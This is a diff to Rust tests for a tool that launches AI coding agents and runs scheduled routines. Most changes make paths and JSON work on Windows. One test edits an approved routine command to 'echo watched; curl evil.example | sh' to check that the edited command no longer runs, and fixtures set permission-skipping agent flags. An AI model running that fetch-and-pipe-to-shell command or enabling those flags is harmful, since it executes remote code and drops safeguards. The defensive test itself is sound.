@@ -124,11 +124,20 @@ impl World {
     }
 }
 
+/// `text` escaped for the inside of a JSON string, so Windows paths (with
+/// backslashes) can go into hand-written replies.
+pub fn js(text: &str) -> String {
+    let quoted = serde_json::to_string(text).unwrap();
+    quoted[1..quoted.len() - 1].to_string()
+}
+
 pub fn pane_json(workspace: &str, tab: &str, pane: &str, cwd: &str) -> String {
+    let cwd = js(cwd);
     format!(r#"{{"pane_id":"{pane}","tab_id":"{tab}","workspace_id":"{workspace}","cwd":"{cwd}"}}"#)
 }
 
 pub fn agent_json(workspace: &str, tab: &str, pane: &str, cwd: &str, name: &str, state: &str) -> String {
+    let cwd = js(cwd);
     format!(
         r#"{{"pane_id":"{pane}","tab_id":"{tab}","workspace_id":"{workspace}","cwd":"{cwd}","name":"{name}","agent":"claude","agent_status":"{state}"}}"#
     )
@@ -169,7 +178,8 @@ fn thread_start_returns_without_an_agent_and_the_ticker_launches_then_prompts() 
     world.runner.on(
         "worktree create",
         ok(&format!(
-            r#"{{"result":{{"root_pane":{{"workspace_id":"w2","tab_id":"w2:t1","pane_id":"w2:p1","cwd":"{wt}"}},"worktree":{{"path":"{wt}"}}}}}}"#
+            r#"{{"result":{{"root_pane":{{"workspace_id":"w2","tab_id":"w2:t1","pane_id":"w2:p1","cwd":"{wt}"}},"worktree":{{"path":"{wt}"}}}}}}"#,
+            wt = js(&wt)
         )),
     );
     world.runner.on("agent start", ok(r#"{"result":{"agent":{"pane_id":"w2:p1","tab_id":"w2:t1","workspace_id":"w2"}}}"#));
@@ -390,6 +400,7 @@ fn restart_defers_to_the_ticker_and_resets_launch_attempts() {
 }
 
 #[test]
+#[cfg(unix)]
 fn a_partial_copy_keeps_the_worktree_unless_the_loss_is_accepted() {
     let world = World::new();
     let project = world.project("demo", "a.sock");
@@ -525,7 +536,7 @@ fn resolving_the_last_thread_closes_its_empty_repo_space() {
     *world.panes.borrow_mut() = format!("[{},{}]", pane_json("w2", "w2:t1", "w2:p1", &cwd), pane_json("w9", "w9:t1", "w9:p1", &repo));
     world.runner.on("worktree remove", ok(r#"{"result":{}}"#));
     // After the removal herdr lists only the repository's primary Space.
-    world.runner.on("workspace list", ok(&format!(r#"{{"result":{{"workspaces":[{{"workspace_id":"w9","label":"repo","pane_count":1,"worktree":{{"repo_key":"{repo}/.git","checkout_path":"{repo}","is_linked_worktree":false}}}}]}}}}"#)));
+    world.runner.on("workspace list", ok(&format!(r#"{{"result":{{"workspaces":[{{"workspace_id":"w9","label":"repo","pane_count":1,"worktree":{{"repo_key":"{repo}/.git","checkout_path":"{repo}","is_linked_worktree":false}}}}]}}}}"#, repo = js(&repo))));
     world.runner.on("process-info", ok(r#"{"result":{"process_info":{"shell_pid":7,"foreground_process_group_id":7,"foreground_processes":[{"pid":7,"name":"zsh"}]}}}"#));
     world.runner.on("workspace close", ok(r#"{"result":{}}"#));
     threads::resolve(&world.ctx(), "demo", "t-0001", &ResolveArgs::default()).unwrap();
@@ -625,7 +636,7 @@ fn thread_start_and_open_refuse_profiles_off_the_allow_list() {
 fn a_thread_launches_with_its_profile_and_fails_closed_once_disallowed() {
     let world = World::new();
     let project = world.project("demo", "a.sock");
-    write_profiles(&world, &format!("{PROFILES}\n[safety.\"{}\"]\nthread_agent_args = [\"--dangerously-skip-permissions\"]\n", project.canonical_dir().display()));
+    write_profiles(&world, &format!("{PROFILES}\n[safety.\"{}\"]\nthread_agent_args = [\"--dangerously-skip-permissions\"]\n", js(&project.canonical_dir().to_string_lossy())));
     let cwd = world.home.path().to_string_lossy().into_owned();
     world.thread(&project, world.home.path(), |t| {
         t.prompt_pending = true;
@@ -658,7 +669,7 @@ fn a_legacy_thread_keeps_claude_flags_to_claude() {
     for (kind, flagged) in [("claude", true), ("codex", false)] {
         let world = World::new();
         let project = world.project("demo", "a.sock");
-        write_profiles(&world, &format!("[safety.\"{}\"]\nthread_agent_args = [\"--dangerously-skip-permissions\"]\n", project.canonical_dir().display()));
+        write_profiles(&world, &format!("[safety.\"{}\"]\nthread_agent_args = [\"--dangerously-skip-permissions\"]\n", js(&project.canonical_dir().to_string_lossy())));
         let cwd = world.home.path().to_string_lossy().into_owned();
         world.thread(&project, world.home.path(), |t| {
             t.prompt_pending = true;
@@ -1385,16 +1396,16 @@ fn make_due(project: &Project, name: &str) {
 fn allow_commands(world: &World, project: &Project) {
     let cfg = world.home.path().join("cfg");
     std::fs::create_dir_all(&cfg).unwrap();
-    std::fs::write(cfg.join("config.toml"), format!("[safety.\"{}\"]\nroutine_commands = true\n", project.canonical_dir().display())).unwrap();
+    std::fs::write(cfg.join("config.toml"), format!("[safety.\"{}\"]\nroutine_commands = true\n", js(&project.canonical_dir().to_string_lossy()))).unwrap();
 }
 
 #[test]
 fn a_command_routine_runs_only_when_enabled_and_approved_and_stops_when_edited() {
     let (world, project, _) = finished_world("idle");
     settle(&project);
-    let text = "+++\nschedule = \"every 1m\"\ncommand = \"echo watched\"\n+++\nLook at it.\n";
+    let text = "+++\nschedule = \"every 1m\"\ncommand = \"echo watched\"\nshell = \"sh\"\n+++\nLook at it.\n";
     write_routine(&project, "watch", text);
-    world.runner.on("sh -c", ok("watched\n"));
+    world.runner.on("echo watched", ok("watched\n"));
     let ctx = world.ctx();
 
     // First seen: nothing fires.
@@ -1406,7 +1417,7 @@ fn a_command_routine_runs_only_when_enabled_and_approved_and_stops_when_edited()
     ticker::tick_project(&ctx, &project).unwrap();
     make_due(&project, "watch");
     ticker::tick_project(&ctx, &project).unwrap();
-    assert_eq!(world.runner.count("sh -c"), 0);
+    assert_eq!(world.runner.count("echo watched"), 0);
     let approvals = items_of(&project, "routine-approval");
     assert_eq!(approvals.len(), 1);
     assert!(approvals[0].summary.contains("routine approve demo watch"));
@@ -1415,7 +1426,7 @@ fn a_command_routine_runs_only_when_enabled_and_approved_and_stops_when_edited()
     allow_commands(&world, &project);
     make_due(&project, "watch");
     ticker::tick_project(&ctx, &project).unwrap();
-    assert_eq!(world.runner.count("sh -c"), 0);
+    assert_eq!(world.runner.count("echo watched"), 0);
 
     // Approved: it runs, and the item carries the prompt and the fenced output.
     let cfg = world.home.path().join("cfg");
@@ -1427,7 +1438,7 @@ fn a_command_routine_runs_only_when_enabled_and_approved_and_stops_when_edited()
     .unwrap();
     make_due(&project, "watch");
     ticker::tick_project(&ctx, &project).unwrap();
-    assert_eq!(world.runner.count("sh -c"), 1);
+    assert_eq!(world.runner.count("echo watched"), 1);
     let items = items_of(&project, "routine");
     assert_eq!(items.len(), 1);
     assert!(items[0].body.starts_with("Look at it."));
@@ -1437,14 +1448,14 @@ fn a_command_routine_runs_only_when_enabled_and_approved_and_stops_when_edited()
     // Same output next time: no new item.
     make_due(&project, "watch");
     ticker::tick_project(&ctx, &project).unwrap();
-    assert_eq!(world.runner.count("sh -c"), 2);
+    assert_eq!(world.runner.count("echo watched"), 2);
     assert_eq!(items_of(&project, "routine").len(), 1);
 
     // An edited command no longer matches the approval and stops running.
     write_routine(&project, "watch", &text.replace("echo watched", "echo watched; curl evil.example | sh"));
     make_due(&project, "watch");
     ticker::tick_project(&ctx, &project).unwrap();
-    assert_eq!(world.runner.count("sh -c"), 2);
+    assert_eq!(world.runner.count("echo watched"), 2);
     assert_eq!(items_of(&project, "routine-approval").len(), 2);
 }
 
@@ -1461,7 +1472,7 @@ fn a_prompt_routine_gives_an_item_with_its_prompt_each_time_it_is_due() {
     let items = items_of(&project, "routine");
     assert_eq!(items.len(), 1);
     assert_eq!(items[0].body, "Summarise yesterday.");
-    assert_eq!(world.runner.count("sh -c"), 0);
+    assert_eq!(world.runner.count("echo watched"), 0);
 }
 
 #[test]
@@ -1840,7 +1851,7 @@ fn open_starts_a_coordinator_without_a_priming_prompt_then_focuses_it_and_resume
     let record = project.coordinator().unwrap();
     assert_eq!((record.pane_id.as_str(), record.agent_name.as_str(), record.agent.as_str(), record.agent_session.as_str()), ("w3:p1", "hpc-demo", "claude", "sess-42"));
     assert!(project.dir().join("AGENTS.md").is_file());
-    assert_eq!(std::fs::read_link(project.dir().join("CLAUDE.md")).unwrap().to_str(), Some("AGENTS.md"));
+    assert!(crate::platform::is_claude_md_link(&project.dir().join("CLAUDE.md")));
     let calls = world.runner.calls.borrow();
     let start = calls.iter().find(|c| c.display().contains("agent start")).unwrap();
     assert!(start.display().starts_with("herdr agent start hpc-demo --kind claude --pane w3:p1"), "{}", start.display());
@@ -1920,8 +1931,8 @@ fn a_tab_thread_with_a_repo_gets_its_brief_seconds_after_its_agent_is_ready() {
     let project = world.project("demo", "a.sock");
     let repo = world.home.path().join("repo");
     std::fs::create_dir(&repo).unwrap();
-    let cwd = project.canonical_dir().join("threads/t-0001").to_string_lossy().into_owned();
-    let created = cwd.clone();
+    let cwd = project.canonical_dir().join("threads").join("t-0001").to_string_lossy().into_owned();
+    let created = js(&cwd);
     world.runner.on_fn(
         |cmd| cmd.display().contains("tab create"),
         move |_| Ok(ok(&format!(r#"{{"result":{{"root_pane":{{"workspace_id":"w1","tab_id":"w1:t2","pane_id":"w1:p2","cwd":"{created}"}}}}}}"#))),
@@ -1976,10 +1987,10 @@ fn a_tab_thread_gets_a_brief_with_the_project_header_and_prompts_are_recorded() 
     let text = std::fs::read_to_string(project.project_md()).unwrap();
     std::fs::write(project.project_md(), text.replacen("goal = \"\"", "goal = \"Ship it\"", 1)).unwrap();
     *world.panes.borrow_mut() = format!("[{}]", world.coordinator_pane(&project));
-    let folder = project.dir().join("threads/t-0001");
+    let folder = project.dir().join("threads").join("t-0001");
     world.runner.on_fn(
         |cmd| cmd.display().contains("tab create"),
-        move |_| Ok(ok(&format!(r#"{{"result":{{"root_pane":{{"workspace_id":"w1","tab_id":"w1:t2","pane_id":"w1:p2","cwd":"{}"}}}}}}"#, folder.display()))),
+        move |_| Ok(ok(&format!(r#"{{"result":{{"root_pane":{{"workspace_id":"w1","tab_id":"w1:t2","pane_id":"w1:p2","cwd":"{}"}}}}}}"#, js(&folder.display().to_string())))),
     );
     world.runner.on("pane get", ok(r#"{"result":{"pane":{"cwd":""}}}"#));
     world.runner.on("agent prompt", ok(r#"{"result":{}}"#));
@@ -2093,7 +2104,7 @@ impl Here {
         let workspace = pane.split(':').next().unwrap();
         format!(
             r#"{{"pane_id":"{pane}","tab_id":"{workspace}:t1","workspace_id":"{workspace}","cwd":"/tmp","foreground_cwd":"{}","name":"{name}","agent":"claude","agent_status":"idle","agent_session":{{"value":"{session}"}}}}"#,
-            self.dir
+            js(&self.dir)
         )
     }
 
@@ -2220,20 +2231,20 @@ fn a_tab_thread_of_a_coordinator_running_in_another_workspace_opens_the_project_
     let h = Here::new(&[]);
     h.runs.borrow_mut().push((0, format!("[{}]", h.child_agent("w5:p1", "", "sess-7"))));
     h.open(true, false).unwrap();
-    let folder = h.project.dir().join("threads/t-0001");
+    let folder = h.project.dir().join("threads").join("t-0001");
     h.world.runner.on("pane get", ok(r#"{"result":{"pane":{"cwd":""}}}"#));
     let args = |title: &str| StartArgs { title: title.into(), repo: None, machine: None, profile: None, kind: Some(Kind::Tab), base: None, task: "Look.".into() };
     let t = threads::start(&h.world.ctx(), "demo", args("Research")).unwrap();
     let calls = h.world.runner.calls.borrow();
     let create = calls.iter().filter(|c| c.display().contains("workspace create")).last().unwrap();
-    assert!(create.display().contains("threads/t-0001") && create.args.contains(&"Demo\u{2800}".to_string()), "{}", create.display());
+    assert!(create.display().contains(&Path::new("threads").join("t-0001").display().to_string()) && create.args.contains(&"Demo\u{2800}".to_string()), "{}", create.display());
     drop(calls);
     // (`Here` scripts every new workspace as w3.)
     assert_eq!(h.world.runner.count("tab rename w3:t1 Research"), 1);
     assert_eq!((t.workspace_id.as_str(), t.pane_id.as_str()), ("w3", "w3:p1"));
 
     // The next tab thread finds that workspace by its shell in the project folder.
-    let folder = std::fs::canonicalize(&folder).unwrap();
+    let folder = dunce::canonicalize(&folder).unwrap();
     *h.world.panes.borrow_mut() = format!("[{},{}]", pane_json("w5", "w5:t1", "w5:p1", "/tmp"), pane_json("w3", "w3:t1", "w3:p1", &folder.to_string_lossy()));
     h.world.runner.on("tab create", ok(r#"{"result":{"root_pane":{"workspace_id":"w3","tab_id":"w3:t2","pane_id":"w3:p2"}}}"#));
     threads::start(&h.world.ctx(), "demo", args("More")).unwrap();
@@ -2243,7 +2254,8 @@ fn a_tab_thread_of_a_coordinator_running_in_another_workspace_opens_the_project_
 
 /// Herdr's default socket, where the ticker looks for hand-started agents.
 fn default_socket(world: &World) -> String {
-    let socket = world.home.path().join(".config/herdr/herdr.sock");
+    // Where Herdr puts its default socket (`%APPDATA%\herdr` on Windows).
+    let socket = crate::platform::config_home(world.home.path(), &|_| None).join("herdr").join("herdr.sock");
     std::fs::create_dir_all(socket.parent().unwrap()).unwrap();
     std::fs::write(&socket, b"").unwrap();
     socket.to_string_lossy().into_owned()
@@ -2290,7 +2302,7 @@ fn a_routine_due_with_no_coordinator_does_nothing_and_is_recorded_as_skipped() {
     write_routine(&project, "standup", "+++\nschedule = \"every 5m\"\n+++\nSummarise.\n");
     write_routine(&project, "watch", "+++\nschedule = \"every 5m\"\ncommand = \"echo watched\"\n+++\nLook.\n");
     allow_commands(&world, &project);
-    world.runner.on("sh -c", ok("watched\n"));
+    world.runner.on("echo watched", ok("watched\n"));
     let ctx = world.ctx();
     let mut memory = crate::steps::Memory::new(&ctx);
     // First seen: nothing fires.
@@ -2303,7 +2315,7 @@ fn a_routine_due_with_no_coordinator_does_nothing_and_is_recorded_as_skipped() {
         ticker::tick_for_test(&ctx, &mut memory);
         // No item of any kind, no command, no notification.
         assert!(inbox::unhandled(&project).is_empty(), "{:?}", inbox::unhandled(&project));
-        assert_eq!(world.runner.count("sh -c"), 0);
+        assert_eq!(world.runner.count("echo watched"), 0);
         assert_eq!(world.runner.count("notification show"), 0);
         let state = crate::steps::load_state(&project);
         for name in ["standup", "watch"] {
@@ -2372,7 +2384,7 @@ fn a_routine_in_one_project_never_reaches_another_projects_coordinator() {
     world.runner.on("agent prompt", ok(r#"{"result":{}}"#));
     // Only beta has a coordinator; alpha has a thread agent in its worktree.
     let (a_dir, b_dir) = (a.canonical_dir().to_string_lossy().into_owned(), b.canonical_dir().to_string_lossy().into_owned());
-    let a_thread = a.canonical_dir().join("threads/t-0001").to_string_lossy().into_owned();
+    let a_thread = a.canonical_dir().join("threads").join("t-0001").to_string_lossy().into_owned();
     std::fs::create_dir_all(&a_thread).unwrap();
     let set = |agents: &[String]| {
         *world.agents.borrow_mut() = format!("[{}]", agents.join(","));
@@ -2682,7 +2694,7 @@ fn rename_moves_the_folder_and_every_reference_to_it() {
     std::fs::write(project.state_dir().join("coordinators.json"), "[]").unwrap();
     // An unknown harness: its conversation cannot follow.
     // A resolved tab thread in the folder, a resolved worktree thread outside it, a remote one.
-    let tab = world.thread(&project, &old.join("threads/t-0001"), |t| {
+    let tab = world.thread(&project, &old.join("threads").join("t-0001"), |t| {
         t.kind = Kind::Tab;
         t.status = Status::Resolved;
         t.worktree_path.clear();
@@ -2705,7 +2717,7 @@ fn rename_moves_the_folder_and_every_reference_to_it() {
     .unwrap();
     let ctx = world.ctx();
     std::fs::create_dir_all(&ctx.config_dir).unwrap();
-    std::fs::write(ctx.config_dir.join("config.toml"), format!("# mine\n[safety.default]\nyolo = false\n\n[safety.\"{old_s}\"]\nyolo = true\nthread_profiles = [\"claude\"]\n")).unwrap();
+    std::fs::write(ctx.config_dir.join("config.toml"), format!("# mine\n[safety.default]\nyolo = false\n\n[safety.\"{}\"]\nyolo = true\nthread_profiles = [\"claude\"]\n", js(&old_s))).unwrap();
     let approval = crate::routine::Approval { project: old_s.clone(), routine: "watch".into(), command_sha256: "h".into(), approved: "now".into() };
     project::write_json(&ctx.config_dir.join("approved-routines.json"), &vec![approval]).unwrap();
     world.runner.on("workspace rename", ok(r#"{"result":{}}"#));
@@ -2720,10 +2732,10 @@ fn rename_moves_the_folder_and_every_reference_to_it() {
     assert_eq!(home.read_project_md().unwrap().0.name, "Home Base");
     let agents = std::fs::read_to_string(home.dir().join("AGENTS.md")).unwrap();
     assert!(agents.contains("(`home`)") && agents.contains(".herdr-project/home-<id>"), "{agents}");
-    assert!(std::fs::read_link(home.dir().join("CLAUDE.md")).is_ok());
+    assert!(crate::platform::is_claude_md_link(&home.dir().join("CLAUDE.md")));
     // Records: paths in the folder follow it, everything else keeps its name.
     let t1 = thread::load(&home, &tab.id).unwrap();
-    assert_eq!(t1.cwd, new.join("threads/t-0001").to_string_lossy());
+    assert_eq!(t1.cwd, new.join("threads").join("t-0001").to_string_lossy());
     assert!(t1.thread_dir.starts_with(&new_s) && t1.thread_dir.ends_with("scratch-t-0001"), "{}", t1.thread_dir);
     let t2 = thread::load(&home, &wt.id).unwrap();
     assert_eq!((t2.branch.as_str(), t2.worktree_path.as_str()), ("hp/scratch/t-0002-x", "/wt/x"));
@@ -2798,7 +2810,7 @@ fn rename_run_again_after_the_move_finishes_the_rest() {
     let old_s = project.canonical_dir().to_string_lossy().into_owned();
     let ctx = world.ctx();
     std::fs::create_dir_all(&ctx.config_dir).unwrap();
-    std::fs::write(ctx.config_dir.join("config.toml"), format!("[safety.\"{old_s}\"]\nyolo = true\n")).unwrap();
+    std::fs::write(ctx.config_dir.join("config.toml"), format!("[safety.\"{}\"]\nyolo = true\n", js(&old_s))).unwrap();
     // As if it stopped right after the folder moved.
     std::fs::rename(project.dir(), world.root.join("demo-2")).unwrap();
     let moved = Project::load(&world.root, "demo-2").unwrap();
